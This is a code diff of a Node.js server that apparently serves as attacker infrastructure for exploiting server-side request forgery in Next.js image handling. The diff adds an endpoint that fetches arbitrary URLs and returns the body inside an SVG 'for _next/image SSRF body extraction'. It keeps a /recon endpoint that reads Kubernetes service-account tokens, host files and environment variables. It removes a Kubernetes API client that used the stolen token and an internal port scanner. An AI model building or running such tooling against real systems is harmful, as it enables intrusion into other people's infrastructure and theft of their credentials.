@@ -3,41 +3,16 @@ const https = require('https');
 const fs = require('fs');
 const PORT = process.env.PORT || 10000;
 
-async function fetchUrl(targetUrl) {
+async function fetchUrl(targetUrl, timeout=8000) {
   return new Promise((resolve, reject) => {
     const mod = targetUrl.startsWith('https') ? https : http;
-    const opts = { timeout: 8000, rejectUnauthorized: false };
-    const req = mod.get(targetUrl, opts, (res) => {
-      let data = '';
-      res.on('data', chunk => data += chunk);
-      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
+    const req = mod.get(targetUrl, { timeout, rejectUnauthorized: false }, (res) => {
+      let data = Buffer.alloc(0);
+      res.on('data', chunk => data = Buffer.concat([data, chunk]));
+      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data.toString('utf-8') }));
     });
     req.on('error', reject);
     req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
-  });
-}
-
-function k8sFetch(path) {
-  const tokenPath = '/var/run/secrets/kubernetes.io/serviceaccount/token';
-  const caPath = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt';
-  let token = '';
-  try { token = fs.readFileSync(tokenPath, 'utf-8').trim(); } catch(e) { return Promise.reject(new Error('no SA token')); }
-  const ca = fs.existsSync(caPath) ? fs.readFileSync(caPath) : undefined;
-  return new Promise((resolve, reject) => {
-    const req = https.get({
-      hostname: 'kubernetes.default.svc',
-      path: path,
-      headers: { 'Authorization': 'Bearer ' + token },
-      ca: ca,
-      rejectUnauthorized: false,
-      timeout: 8000
-    }, (res) => {
-      let data = '';
-      res.on('data', chunk => data += chunk);
-      res.on('end', () => resolve({ status: res.statusCode, body: data }));
-    });
-    req.on('error', reject);
-    req.on('timeout', () => { req.destroy(); reject(new Error('k8s timeout')); });
   });
 }
 
@@ -47,6 +22,49 @@ const server = http.createServer(async (req, res) => {
   if (url.pathname === '/health') {
     res.writeHead(200, { 'Content-Type': 'application/json' });
     return res.end('{"status":"ok"}');
+  }
+
+  // Returns a valid SVG image with arbitrary text
+  // Use: /_next/image?url=https://our-proxy/svg?text=hello
+  if (url.pathname === '/svg') {
+    const text = url.searchParams.get('text') || 'no data';
+    const lines = text.match(/.{1,80}/g) || [text];
+    let textElements = lines.map((line, i) => 
+      `<text x="5" y="${20 + i * 16}" font-family="monospace" font-size="12" fill="black">${line.replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/&/g,'&amp;')}</text>`
+    ).join('\n');
+    const height = Math.max(100, 30 + lines.length * 16);
+    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="800" height="${height}">
+<rect width="800" height="${height}" fill="white"/>
+${textElements}
+</svg>`;
+    res.writeHead(200, { 'Content-Type': 'image/svg+xml', 'Content-Length': Buffer.byteLength(svg) });
+    return res.end(svg);
+  }
+
+  // Fetch URL and return response as SVG image (for _next/image SSRF body extraction)
+  if (url.pathname === '/imgfetch') {
+    const target = url.searchParams.get('url');
+    if (!target) { res.writeHead(400); return res.end('need url'); }
+    try {
+      const r = await fetchUrl(target);
+      const body = r.body.substring(0, 4000);
+      const lines = body.match(/.{1,90}/g) || [body];
+      let textElements = lines.map((line, i) => 
+        `<text x="5" y="${18 + i * 14}" font-family="monospace" font-size="11" fill="black">${line.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</text>`
+      ).join('\n');
+      const height = Math.max(100, 30 + lines.length * 14);
+      const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="900" height="${height}">
+<rect width="900" height="${height}" fill="white"/>
+<text x="5" y="${height-5}" font-size="9" fill="gray">Status: ${r.status} | Fetched: ${target}</text>
+${textElements}
+</svg>`;
+      res.writeHead(200, { 'Content-Type': 'image/svg+xml' });
+      return res.end(svg);
+    } catch (e) {
+      const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="400" height="50"><text x="5" y="20" fill="red">${e.message}</text></svg>`;
+      res.writeHead(200, { 'Content-Type': 'image/svg+xml' });
+      return res.end(svg);
+    }
   }
 
   if (url.pathname === '/fetch') {
@@ -70,20 +88,7 @@ const server = http.createServer(async (req, res) => {
       res.writeHead(200, { 'Content-Type': 'text/plain' });
       return res.end(data);
     } catch (e) {
-      res.writeHead(500, { 'Content-Type': 'application/json' });
-      return res.end(JSON.stringify({ error: e.message }));
-    }
-  }
-
-  if (url.pathname === '/k8s') {
-    const path = url.searchParams.get('path') || '/api';
-    try {
-      const r = await k8sFetch(path);
-      res.writeHead(200, { 'Content-Type': 'application/json' });
-      return res.end(JSON.stringify(r));
-    } catch (e) {
-      res.writeHead(500, { 'Content-Type': 'application/json' });
-      return res.end(JSON.stringify({ error: e.message }));
+      res.writeHead(500); return res.end(e.message);
     }
   }
 
@@ -92,33 +97,14 @@ const server = http.createServer(async (req, res) => {
     return res.end(JSON.stringify(process.env));
   }
 
-  if (url.pathname === '/scan') {
-    const host = url.searchParams.get('host') || 'localhost';
-    const results = {};
-    const ports = [80,443,3000,5432,6379,8080,9090,9229,10000];
-    for (const port of ports) {
-      try {
-        const r = await fetchUrl(`http://${host}:${port}/`);
-        results[port] = { status: r.status, bodyLen: r.body.length, body: r.body.substring(0,300) };
-      } catch (e) { results[port] = { error: e.message }; }
-    }
-    res.writeHead(200, { 'Content-Type': 'application/json' });
-    return res.end(JSON.stringify(results));
-  }
-
   if (url.pathname === '/recon') {
     const data = {};
-    // SA token
     try { data.saToken = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token','utf-8').trim(); } catch(e) { data.saToken = e.message; }
     try { data.namespace = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/namespace','utf-8').trim(); } catch(e) { data.namespace = e.message; }
-    // hosts
     try { data.hosts = fs.readFileSync('/etc/hosts','utf-8'); } catch(e) { data.hosts = e.message; }
     try { data.resolv = fs.readFileSync('/etc/resolv.conf','utf-8'); } catch(e) { data.resolv = e.message; }
-    // process info
     data.env = process.env;
-    data.cwd = process.cwd();
     data.uid = process.getuid();
-    data.pid = process.pid;
     res.writeHead(200, { 'Content-Type': 'application/json' });
     return res.end(JSON.stringify(data));
   }
